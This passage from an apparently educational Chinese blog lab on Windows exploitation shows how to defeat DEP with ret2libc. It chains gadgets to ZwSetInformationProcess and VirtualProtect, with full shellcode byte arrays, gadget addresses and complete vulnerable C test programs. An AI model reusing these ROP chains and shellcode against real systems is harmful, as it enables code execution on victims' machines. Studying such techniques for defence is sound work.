src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619180931685-16562939498348.png" alt="image-20220619180931685"></p><p>现在，筛选出合适指令，找出可写入而不影响后续指令的寄存器，显然，PUSH ESP POP EBP RETN 指令需要放在 <code>mov al,1</code> 之后，在关闭 DEP 之前。而不影响关闭 DEP 的寄存器只有 ESP，所以选择 PUSH ESP POP EBP RETN 指令序列。</p><p><strong>（3）消除 EBP-4 被冲刷影响，修正 EBP</strong></p><p>现在还有一个严重的问题，直接将 ESP 的值赋给 EBP 返回后， ESP 相对 EBP 位于高址位置，当有入栈操作时 EBP-4 处的值可能会被冲刷掉，进而影响传入 ZwSetInformationProcess 的参数，造成 DEP 关闭失败。我们先用 0x5D1D8B85 处的 PUSH ESP POP EBP RET 4 指令来修正 EBP，然后调试根据堆栈情况来消除 EBP-4 被冲刷的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>重新编译程序后调试，在 0x7C95683B 处（CALL ZwSetInformationProcess）下断点，待程序中断后观察堆栈情况。如下图所示，EBP-4 中的内容已经被覆盖为 0x22，根据_KEXECUTE_OPTIONS 结构我们知道 DEP 只和结构中的前 4 位有关，只要前 4 位的二进制代码为 0100 就可关闭 DEP，而 0x22（00100010）刚刚符合这个要求，所以用 0x22 冲刷掉 EBP-4 处的值还是可以关闭 DEP 的。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/../Blog_rgzz/source/_posts/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620081243474.png" alt="image-20220620081243474"></p><p>虽然我们已经关闭了 DEP，但是我们失去了进程的控制权。我们再来看看关闭 DEP 后程序返回时堆栈的情况。单步运行到 0x7C93CD6F 处（retn 4），发现 ESP 指向 0x0012FE70，此处值为 0x00000004，它就是关闭 DEP 时 PUSH 4 的结果，现在我们无法转入 shellcode 执行了，所以我们还需要对 ESP 或者 EBP 进行调整。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620082759710-16562939498349.png" alt="image-20220620082759710"></p><p><strong>（4）夺回程序控制权</strong></p><p>ESP 值小于 EBP 时，防止入栈时破坏当前栈内容的调整方法就是减小 ESP和增大 EBP。由于 shellcode 位于内存低址，所以减小 ESP 会破坏 shellcode，而增大 EBP 的指令在本次实验中无法找到。一个变通方法是增大 ESP 到一个安全的位置，让 EBP 和 ESP 之间的空间足够大，这样关闭 DEP 过程中的压栈操作就无法冲刷到 EBP 的范围内了。</p><p>我们可以使用带有偏移量的 RETN 指令来增大 ESP，如 RETN 0x28 等指令可以执行 RETN 指令后再将 ESP 增加 0x28 个字节。我们可以通过 OllyFindAddr 插件中的 Overflow return address --&gt; POP RETN+N 选项来查找相关指令。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620084553195-16556859539081-165629394983410.png" alt="image-20220620084553195"></p><p>在选取指令时，不能对 ESP 和 EBP 有直接操作。否则会无法跳回 shellcode 执行。选择 0x7C974A19 处的 RETN 28，来增大 ESP。在关闭 DEP 前加入增大 ESP 指令地址。注意：修正 EBP 指令返回时带有的偏移量回影响后续指令，所以我们在布置 shellcode 时需加入相应填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在 0x7C93CD6F 处中断程序，建议不要在加载完程序直接在 0x7C93CD6F 中断，先在 0x7C95683B（CALL ZwSetInformationProcess）处下断点，然后单步运行到 0x7C93CD6F，否则您会被中断到崩溃。堆栈情况如下图，增大 ESP 后关键数据没有被破坏。执行完 RETN 0x04 后 ESP 将指向 0x0012FE74，所以我们只要在 0x0012FE70 放置一条 JMP ESP 指令就能让程序转入堆栈执行指令。通过 OllyFindAddr 插件中的 Overflow return address --&gt; Find CALL/JMP ESP 来搜索指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620120052278-165629394983411.png" alt="image-20220620120052278"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620121426020-165629394983412.png" alt="image-20220620121426020"></p><p>用 0x7DC5C1B4 处的 JMP ESP，然后在 0x0012FE70 处放一个长跳指令，让程序跳转到 shellcode 的起始位置来执行 shellcode，根据内存状态，可以计算处 0x0012FE74 距离 shellcode 起始位置（0x0012FDB0）有 200 个字节，所以需要回调 205个字节（+5 字节跳转指令长度）。</p><p>布置 shellcode，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620123304414-165629394983413.png" alt="image-20220620123304414"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span> <span class="comment">//回跳指令</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br></pre></td></tr></table></figure><p>将 shellcode 布置好后重新编译运行，调试，在 0x7C93CD6F 处下断点，然后单步运行，观察 程序执行流程。执行完 JMP ESP 后就能看到程序转入 shellcode。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131557944-165629394983414.png" alt="image-20220620131557944"></p><p>继续运行就能看到对话框了。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131754734-165629394983415.png" alt="image-20220620131754734"></p><h4 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充：</h4><p>微软在 Windows 2003 SP2 以后对 LdrpCheckNXCompatibility 函数进行了少许修改，对我们影响最大的是该函数在执行过程中会对 ESI 指向的内存附近进行操作。保证 ESI 指向的内存为可写内存，利用类似的指令如 push esp pop esi retn 来调整 ESI，这些指令显示在 OllyFindAddr 插件中 Disable DEP→Disable DEP &gt;=2003 SP2 搜索结果的 step4 部分。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620145822498-165629394983516.png" alt="image-20220620145822498"></p><p>这些指令不好找，这里介绍一种替代方法：</p><p>（ 1）找到 pop eax retn 指令，并让程序转入该位置执行。<br>（ 2）找到一条 pop esi retn 的指令，并保证在执行（ 1）中 pop eax 时它的地址位于栈顶，这样就可以把该地址放到 eax 中。<br>（ 3）找到 push esp jmp eax 指令，并转入执行。<br>这样就相当于执行了 push esp pop esi retn， esi 被指到了可写位置。下边我们给出一种可以在 Windows 2003 SP2 下边成功溢出的代码，大家可以自行调试，感受一下跳板执行选取和 shellcode 布局的思路。代码运行环境为 Windows 2003 SP2 中文版，代码中的各跳板地址可能需要重新调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x77\xBE\x77&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x81\x71\xBA\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\x3D\x68\xBE\x7C&quot;</span> <span class="comment">//pop esi retn</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x9B\xF4\x87\x7C&quot;</span> <span class="comment">//retn 0x30</span></span><br><span class="line"><span class="string">&quot;\x17\xF5\x96\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\x23\x1E\x1A\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\xE9\x27\xFF\xFF&quot;</span> <span class="comment">//跳转到 shellcode 起始地址</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ret2libc-实战之利用-virtualprotect"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualprotect"></a> Ret2Libc 实战之利用 VirtualProtect</h3><p>Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。为了解决这个问题微软提供了修改内存属性的 <strong>VirtualProtect 函数</strong>，该函数位于 kernel32.dll 中，该函数可以修改指定内存的属性，包括是否可执行属性。因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过 DEP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,	<span class="comment">//要改变属性的内存起始地址。</span></span></span><br><span class="line"><span class="params">DWORD dwSize,	<span class="comment">//要改变属性的内存区域大小。</span></span></span><br><span class="line"><span class="params">DWORD flNewProtect,		<span class="comment">//内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（ 0x40）时该内存页为可读可写可执行。</span></span></span><br><span class="line"><span class="params">PDWORD lpflOldProtect	<span class="comment">//内存原始属性类型保存地址。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//修改内存属性成功时函数返回非 0，修改失败时返回 0。  </span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620151956530-165629394983517.png" alt="image-20220620151956530"></p><p>[EBP+C]和[EBP+10]这两个参数是固定的，[EBP+8]和[EBP+14]这两个参数是动态确定的，要保证[EBP+8]可以落在我们可以控制的堆栈范围内，[EBP+14]要保证为一可写地址。</p><p>按照如下参数布置好栈帧就可以将 shellcode 所在内存区域设置为可执行模式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">shellcode 所在内存空间起始地址,</span></span><br><span class="line"><span class="params">shellcode 大小,</span></span><br><span class="line"><span class="params"><span class="number">0x40</span>,</span></span><br><span class="line"><span class="params">某个可写地址</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br>（ 1）参数中包含 0x00，strcpy 在复制字符串的时候会被截断，所以我们不能攻击 strcpy 函数，改为攻击 memcpy 函数。<br>（ 2）对 shellcode 所在内存空间起始地址的确定，不同机器之间 shellcode 在内存中的位置可能会有变化，本次实验中我们在栈帧中<strong>构造方法动态确定 shellcode 所在内存空间起始地址。</strong></p></blockquote><hr><h4 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x8B\x17\x84\x7C&quot;</span> <span class="comment">//RETN</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span> <span class="comment">//修改内存大小</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">//可读可写可执行内存属性代码</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span> <span class="comment">//修改内存属性</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-2"><a class="markdownIt-Anchor" href="#实验思路-2"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式。<br>（ 4）通过 push esp jmp eax 指令序列动态设置 VirtualProtect 函数中的 shellcode 所在内存起始地址以及内存原始属性类型保存地址。<br>（ 5）内存区域被设置成可执行模式后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤：</h4><p><strong>（ 1）由于溢出时，EBP被覆盖破坏，先修复 EBP（把 ESP赋值给 EBP）</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址（0x77ECE353）覆盖 test 函数的返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624203825690-165629394983518.png" alt="image-20220624203825690"></p><p>retn 4 返回到 0x0012FE70（ebp+0x8） 处存储的地址（0x00000000）执行，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624204155092-165629394983519.png" alt="image-20220624204155092"></p><p><strong>（ 2）利用 VirtualProtect 函数将 shellcode 